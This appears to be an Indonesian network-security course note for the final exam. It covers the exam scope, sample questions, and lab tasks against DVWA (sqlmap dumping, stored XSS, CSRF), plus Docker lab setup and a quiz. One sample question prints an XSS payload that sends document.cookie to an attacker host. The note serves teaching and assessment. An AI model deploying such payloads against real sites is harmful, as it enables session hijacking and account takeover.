# Pertemuan 16 — UAS: Info Ujian + Rekap Semester

File sumbernya `Network-Security-Course-Bank/Pertemuan16.md` (judul asli: "Pertemuan 16: UAS (Ujian Akhir Semester)"). Ini **bukan** materi baru — isinya info ujian + cakupan materi. Aku rangkum jadi catatan belajar akhir: apa yang diujikan, contoh soal, dan rekap Pertemuan 9–15 biar kamu tinggal poles sebelum UAS.

## Info Ujian

| Keterangan | Detail |
|---|---|
| **Jenis** | UAS (Ujian Akhir Semester) |
| **Cakupan** | Pertemuan 9 – 15 (+ komprehensif Pertemuan 1 – 7) |
| **Format** | Teori + Praktik + Laporan |
| **Durasi** | 120 menit |

## Rekap Cakupan Materi per Pertemuan

### Pertemuan 9 — SQL Injection
- Jenis SQLi: In-band, Blind, Out-of-band
- Manual Union-Based injection & analisis kolom
- Automated scanning dengan `sqlmap` (scan, dump, banner)
- Prepared statements & parameterized queries sebagai mitigasi

### Pertemuan 10 — XSS & CSRF
- Stored, Reflected, DOM-based XSS
- Teknik pencurian cookie via XSS
- CSRF dengan auto-submit form
- CSP, HttpOnly, SameSite, Anti-CSRF Token

### Pertemuan 11 — CVE & CVSS
- Format dan lifecycle CVE ID
- CVSS v4.0 metric groups: Base, Threat, Environmental
- NVD sebagai integrator CVE + CVSS
- Menghitung & menginterpretasi skor severity
- Studi kasus: Log4Shell, EternalBlue

### Pertemuan 12 — Setup VPS & Nginx
- Provisioning VPS dan install EasyPanel
- Nginx sebagai reverse proxy & WAF dasar
- Rate limiting, User-Agent blocking, SQL Injection filtering di Nginx
- SSL dengan Certbot, monitoring dengan Fail2ban

### Pertemuan 13 — Hands-On Reverse Proxy
- Arsitektur NginxProxy vs HalimunProxy
- Perbedaan enkripsi end-to-end vs WAF rules biasa
- Replay protection, SSRF guard, camouflage routing
- Analisis header information leakage

### Pertemuan 14 — Firewalling dengan iptables
- Netfilter tables dan chains (INPUT, OUTPUT, FORWARD)
- DROP vs REJECT vs ACCEPT
- Rate limiting dan port scanning detection
- Persistence dengan iptables-persistent

### Pertemuan 15 — IDS dengan Snort
- Arsitektur Snort (Decoder, Preprocessor, Detection Engine)
- Mode operasi: Sniffer, Logger, IDS
- Sintaks rules Snort dan custom rules
- Deteksi Nmap scan dan SSH brute force

> [!TIP]
> Pola cakupan UAS jelas: **9–10** = serangan web app, **11** = manajemen kerentanan, **12–13** = pertahanan lapisan proxy/server, **14–15** = pertahanan jaringan (firewall & IDS). Satu kelompok serang, satu kelompok pertahan — kuisinya seimbang.

## Contoh Soal Teori (dari materi)

**Bagian A — Web Application Security**
1. Jelaskan perbedaan SQL Injection In-Band dan Blind SQL Injection. Beri contoh payload masing-masing tipe.
2. Aplikasi punya kolom komentar yang merender HTML tanpa sanitasi. Penyerang masukkan payload `<img src="x" onerror="fetch('http://attacker.com/?c='+document.cookie)">`. (a) Jenis XSS apa ini? (b) Apa yang terjadi saat user lain buka halaman? (c) Cara mencegahnya?
3. Jelaskan mengapa CSRF berhasil meski tanpa XSS. Apa kondisi yang harus terpenuhi agar CSRF bisa dieksploitasi?

**Bagian B — CVE & CVSS**
4. Kerentanan web server: bisa dieksploitasi dari internet, tanpa autentikasi, tanpa interaksi user; attacker bisa baca semua file (C: High), tidak bisa modifikasi (I: None), server tetap jalan (A: None). Hitung perkiraan CVSS Base Score dan kategori severity-nya!
5. Apa beda fungsi `cve.org`, `nvd.nist.gov`, dan `first.org/cvss`? Kapan kita pakai masing-masing?

**Bagian C — Defense (Proxy, Firewall, IDS)**
6. Jelaskan mengapa `sqlmap` berhasil menyerang backend langsung tapi gagal total melawan HalimunProxy, padahal keduanya backend PHP yang sama!
7. Rule iptables berikut: `iptables -A INPUT -p tcp --dport 22 -m limit --limit 3/min -j ACCEPT` lalu `iptables -A INPUT -p tcp --dport 22 -j DROP`. (a) Apa fungsi rule ini? (b) Kelemahan dibanding Fail2ban?
8. Tulis rule Snort untuk mendeteksi percobaan SQL Injection via HTTP yang mengandung kata kunci `UNION` atau `SELECT` di port 80. Jelaskan tiap bagiannya!

## Soal Praktik UAS

### Praktik 1 — Full Attack Chain pada DVWA
1. **SQL Injection:** pakai `sqlmap` untuk dump tabel `users` dari database DVWA. Screenshot tiap langkah.
2. **Stored XSS:** masukkan payload XSS pencuri session cookie ke kolom komentar DVWA. Tunjukkan cookie yang tercuri di terminal listener Kali.
3. **CSRF:** buat halaman HTML exploit yang mengubah password admin DVWA. Tunjukkan password berhasil berubah.

### Praktik 2 — Hands-On Proxy Comparison
Jalankan lab `HandsOnServerProxy/NginxProxy`, dokumentasikan hasil serangan ke **Direct Backend (port 5000)** vs **via Nginx Proxy (port 8080)** untuk: akses file `/config`, SQL Injection via `sqlmap`, header information (Server, X-Powered-By). Buat tabel perbandingan + screenshot log Nginx.

### Praktik 3 — CVE Research & CVSS Scoring
1. Cari 2 CVE tahun 2023–2024 dengan skor Critical (≥9.0) dari `nvd.nist.gov`
2. Untuk tiap CVE: software terdampak, vektor serangan (jelaskan tiap metrik CVSS), apakah sudah ada patch + rekomendasi
3. Verifikasi skor dengan CVSS Calculator `first.org/cvss/calculator/4.0`

### Praktik 4 — Nginx Hardening (Opsional, nilai tambah)
Konfigurasi Nginx (VPS Pertemuan 12 atau VM lokal) dengan: rate limiting (login 5/menit, API 10/detik), UA blocking (curl/wget/nmap/sqlmap), SQLi filter di query string, security headers (X-Frame-Options, X-XSS-Protection, X-Content-Type-Options). Lalu jalankan Nikto, hitung persentase serangan Nikto yang terblokir.

## Format Laporan UAS

```
1. Cover (Nama, NIM, Kelas)
2. Pendahuluan (tujuan praktikum)
3. Metodologi (tools dan environment)
4. Hasil per soal praktik (screenshot tiap langkah + analisis)
5. Kesimpulan dan rekomendasi
6. Referensi
```

## Referensi Persiapan UAS

| Referensi | Link |
|---|---|
| OWASP Top 10 2021 | `https://owasp.org/Top10/` |
| PortSwigger Web Security Academy | `https://portswigger.net/web-security` |
| NVD | `https://nvd.nist.gov/` |
| CVSS v4.0 Calculator | `https://www.first.org/cvss/calculator/4.0` |
| Snort Rules Docs | `https://docs.snort.org/` |
| iptables Manual | `https://linux.die.net/man/8/iptables` |
| Nginx Security Headers | `https://nginx.org/en/docs/http/ngx_http_headers_module.html` |

## Lab UAS — Docker Compose Referensi Cepat

```yaml
services:
  kali-attacker:
    image: kalilinux/kali-rolling
    container_name: kali-attacker
    tty: true
    stdin_open: true
    privileged: true
    networks: { lab_network: { ipv4_address: 172.20.0.5 } }

  dvwa-target:
    image: vulnerables/web-dvwa
    container_name: target-web
    ports: [ "8080:80" ]
    networks: { lab_network: { ipv4_address: 172.20.0.10 } }

networks:
  lab_network:
    driver: bridge
    ipam: { config: [ { subnet: 172.20.0.0/24 } ] }
```

```bash
docker-compose up -d
docker exec -it kali-attacker bash
apt update && apt install -y nmap sqlmap nikto curl python3
```

> [!IMPORTANT]
> Praktik 1 menggabungkan tiga pertemuan sekaligus (SQLi, XSS, CSRF) di satu lab DVWA. Kalau ada satu yang kamu belum fasih, itu prioritas belajar sebelum UAS — bukan cuma teori, tapi ** demonstrating-nya lewat screenshot**.

```quiz
Q: UAS Network Security mengcover materi pertemuan...
+ 9–15 dengan komponen komprehensif Pertemuan 1–7
- Hanya pertemuan 14–15
- Hanya pertemuan 1–8
> Cakupan utama 9–15, tetap komprehensif dari Pertemuan 1–7.

Q: Pada contoh soal CSRF, kondisi yang harus terpenuhi agar serangan berhasil adalah...
+ Korban sedang terautentikasi di aplikasi dan penyerang bisa membuat korban membuka halaman exploit-nya
- Korban harus berada di jaringan yang sama
- Korban harus mengisi password baru sendiri
> CSRF memanfaatkan sesi aktif; kondisi utama adalah adanya sesi valid dan request lintas-situs yang dibuat oleh korban.

Q: Soal iptables di Bagian C memasang rate limit 3/menit lalu DROP untuk port 22. Kelemahan dibanding Fail2ban adalah...
+ Rate limit konstan (statis) tidak bisa mengenali pola serangan seperti Fail2ban yang ban berdasarkan percobaan gagal terdeteksi dari log
- Rate limit tidak bisa dipakai untuk SSH
- Fail2ban lebih cepat karena bahasa C
> Fail2ban memantau log (mis. auth.log) dan membanned IP setelah N percobaan gagal; limit statis tidak tahu konteks berhasil/gagal.

Q: Praktik UAS meminta verifikasi skor CVSS dengan calculator di...
+ first.org/cvss/calculator/4.0
- cve.org
- nvd.nist.gov (tanpa calculator)
> NVD memberi skor, FIRST punya kalkulator resmi CVSS untuk memverifikasi perhitungan manual.

Q: Praktik 1 (Full Attack Chain) menggabungkan tiga teknik di DVWA, yaitu...
+ SQL Injection dengan sqlmap, Stored XSS pencuri cookie, dan CSRF ubah password admin
- DNS spoofing, ARP poisoning, dan SYN flood
- Nginx hardening, Certbot, dan Fail2ban
> Ketiganya adalah kerentanan web app dari Pertemuan 9–10 yang harus dikuasai untuk praktik.

Q: Laporan UAS harus berformat...
+ PDF dengan struktur: cover, pendahuluan, metodologi, hasil per soal (screenshot + analisis), kesimpulan, referensi
- Slideshow saja
- Markdown tanpa screenshot
> Struktur enam bagian itu tertulis eksplisit di materi, termasuk screenshot tiap langkah praktik.

Q: Praktik 4 (Nginx Hardening) dinilai sebagai...
+ Nilai tambah (opsional)
- Bagian wajib
- Dihitung negatif jika tidak dikerjakan
> Materi menandainya "Opsional — Nilai Tambah": worth dikerjakan untuk menambah nilai.

Q: Jika sqlmap berhasil menyerang backend langsung tapi gagal total melawan HalimunProxy, penyebabnya adalah...
+ HalimunProxy menolak payload yang tidak terenkripsi AES-256-CBC sehingga scanner tidak bisa fuzzing
- Backend HalimunProxy menggunakan database NoSQL
- sqlmap tidak bisa berjalan di container
> Ini inti Pertemuan 13: lapisan enkripsi wajib membuat setiap request plaintext scanner dianggap sampah oleh proxy.
```